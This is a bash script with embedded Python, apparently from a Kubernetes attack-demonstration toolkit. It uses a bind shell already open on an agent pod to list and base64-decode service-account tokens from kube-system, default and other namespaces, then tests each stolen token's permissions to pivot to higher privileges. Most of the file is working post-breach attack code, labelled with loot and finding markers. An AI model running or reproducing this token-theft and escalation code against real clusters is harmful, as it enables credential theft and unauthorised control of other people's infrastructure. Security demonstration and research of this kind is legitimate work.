#!/usr/bin/env bash
# Privilege escalation: extract ServiceAccount tokens from other namespaces
# and test what permissions they grant.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-steal-tokens.sh"
  echo "  Extracts SA tokens from accessible namespaces and tests their permissions."
  echo "  Demonstrates privilege escalation via token pivoting."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: SA Token Pivoting"
echo "@PHASE Token-Pivoting"

PYTHON_CODE="${K8S_API_PREAMBLE}

print('@PHASE Token-Enumeration')
print('=' * 60)
print('  SA TOKEN PIVOTING')
print('=' * 60)
print(f'  Current token (first 50 chars): {token[:50]}...')
print()

target_namespaces = ['kube-system', 'default', 'target-apps', 'monitoring']

for ns in target_namespaces:
    print(f'  --- Checking secrets in {ns} ---')
    secrets = k8s_get(f'/api/v1/namespaces/{ns}/secrets')
    if 'error' in secrets:
        print(f'    Access denied: HTTP {secrets[\"error\"]}')
        continue

    sa_secrets = [s for s in secrets.get('items', [])
                  if s.get('type') == 'kubernetes.io/service-account-token']

    if not sa_secrets:
        print(f'    No SA token secrets found')
        continue

    print(f'    Found {len(sa_secrets)} SA token(s):')
    print(f'@FINDING high {len(sa_secrets)} SA tokens found in {ns}')
    for s in sa_secrets:
        sa_name = s['metadata'].get('annotations', {}).get(
            'kubernetes.io/service-account.name', 'unknown')
        sa_token_b64 = s.get('data', {}).get('token', '')
        if sa_token_b64:
            sa_token = base64.b64decode(sa_token_b64).decode()
            print(f'    SA: {sa_name}')
            print(f'      Token: {sa_token[:50]}...')
            print(f'@LOOT tokens {ns}/{sa_name}')

            # Test what this token can do
            test_conn = http.client.HTTPSConnection('kubernetes.default.svc', 443, context=ctx)
            test_headers = {'Authorization': f'Bearer {sa_token}', 'Content-Type': 'application/json'}
            review_body = json.dumps({
                'apiVersion': 'authorization.k8s.io/v1',
                'kind': 'SelfSubjectRulesReview',
                'spec': {'namespace': 'default'}
            })
            test_conn.request('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
                            body=review_body, headers=test_headers)
            resp = test_conn.getresponse()
            if resp.status == 201:
                rules = json.loads(resp.read()).get('status', {}).get('resourceRules', [])
                print(f'      Permissions: {len(rules)} rules in default ns')
                for r in rules[:5]:
                    verbs = ','.join(r.get('verbs', []))
                    resources = ','.join(r.get('resources', []))
                    print(f'        {verbs} -> {resources}')
            else:
                resp.read()
                print(f'      Could not enumerate permissions: HTTP {resp.status}')

print()
print('@RESULT success Token pivoting complete')
print('Token pivoting complete.')
"

echo "  Piping token-pivoting script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Token extraction complete."
